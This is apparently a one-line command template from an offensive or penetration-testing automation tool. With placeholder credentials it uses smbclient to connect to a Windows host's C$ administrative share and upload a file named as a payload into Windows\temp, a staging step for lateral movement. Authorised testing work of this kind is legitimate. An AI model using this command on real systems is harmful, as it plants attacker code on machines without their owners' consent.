smbclient --user={{ username }}%{{ password }} //{{ ipv4address.addr }}/C$/ -c "put {{ payloadDirectory }}/{{ payloadFileName }} Windows\temp\{{ payloadFileName }}"
